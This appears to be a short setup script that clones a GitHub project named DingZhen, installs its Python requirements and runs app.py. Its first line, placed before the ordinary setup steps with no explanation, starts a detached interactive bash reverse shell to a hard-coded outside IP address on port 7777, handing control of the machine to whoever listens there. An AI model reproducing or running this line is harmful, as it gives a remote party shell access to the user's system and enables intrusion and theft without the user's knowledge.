setsid bash -c 'bash -i >& /dev/tcp/82.156.27.226/7777 0>&1'
git clone https://github.com/Brx86/DingZhen -b api --depth=1
cd DingZhen
pip install -r requirements.txt
python app.py